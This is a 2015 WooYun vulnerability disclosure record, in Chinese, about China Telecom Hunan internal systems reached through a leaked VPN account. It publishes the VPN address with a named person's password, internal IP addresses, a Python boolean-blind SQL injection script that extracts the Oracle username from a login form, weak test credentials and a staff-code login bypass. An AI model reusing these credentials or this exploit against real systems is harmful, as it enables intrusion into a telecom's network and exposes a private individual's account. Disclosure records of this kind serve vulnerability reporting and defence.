{"id": 46274, "wybug_id": "wooyun-2015-091835", "wybug_title": "中国电信湖南省某同学VPN账号泄露可内网漫游/系统多多", "wybug_corp": "中国电信", "wybug_author": "小饼仔", "wybug_date": "2015-01-14 15:59", "wybug_open_date": "2015-02-28 16:00", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "内网漫游", "泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-28：\t细节向公众公开  简要描述： 漫游之~ 详细说明：  电信湖南省VPN地址：\nhttps://202.103.124.60/por/login_psw.csp\n\n\nVPN账号密码\n刘昱国 / 13367472333\n   漏洞证明：  成功登陆，里面近百个系统\n\n\n\n可以远程连接\n\n部分系统举例CRM\n\n客服系统\n\n4G生产\n\n部分系统存在注入\nhttp://134.161.32.140:8020/(S(wnp0nbywuk3sy055pwohmo45))/login.aspx\n布尔盲注\n\n猜出当前用户：\n\n验证脚本\n#! /usr/bin/env python#-*-coding:utf-8-*-import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'Content-Type': 'application/x-www-form-urlencoded',    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)'}payloads = list(string.ascii_lowercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.']print 'start to retrive Oracle user:'user = ''for i in range(1,5):    for payload in payloads:        conn = httplib.HTTPConnection('134.175.25.9', 9001, timeout=30)        url = ' /uss/loginAction.do?method=login'        params = urllib.urlencode(            {'staffCode': '\\' or ascii(substr(lower(user), %s, 1))=%s and \\'1\\'=\\'1' % (i, ord(payload)),             'staffPwd': '111',            'ckbMenuId': 'true',            'menuId': ''                  })        conn.request('POST',                     url,                     params,                     headers)        html_doc = conn.getresponse().read().decode('GBK')            if html_doc.find(u'密码不正确') > 0:            user += payload            print '\\n[in progress]', user            break        else:            print '.',print '\\nOracle user is', user\n销售支持网\nhttp://134.175.25.9:9001/uss/\n\n\n猜到一个湖南省内部知识应用平台的账号密码\nhttp://134.176.1.20:4000/auth!login.do;jsessionid=CA4CF0A2100AE0E96B0B906F6B6AE11C\n账号密码\ntest/123456\n\n\n省客服10000号\nhttp://134.176.101.10/TFCC10000/index.aspx\n\n\n工号输入111，登陆模式选应急，直接登陆了\n\n某系统JBOSS未授权访问\n\n其他就不一一举例了   修复方案：  ~   版权声明：转载请注明来源 小饼仔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-01-19 09:31 厂商回复： CNVD已经确认所述漏洞情况，将转由CNCERT向中国电信通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}